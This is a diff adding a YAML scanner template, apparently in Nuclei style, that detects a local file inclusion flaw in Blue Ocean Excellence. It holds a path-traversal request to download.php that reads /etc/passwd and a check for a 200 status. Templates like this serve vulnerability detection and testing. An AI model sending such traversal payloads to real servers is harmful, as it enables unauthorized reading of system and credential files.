@@ -1,0 +1,19 @@
+id: blue-ocean-excellence-lfi
+brief:
+    title: Blue Ocean Excellence - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: Blue Ocean Excellence is vulnerable to local file inclusion.
+    label:
+        - blue-ocean
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/download.php?file=../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
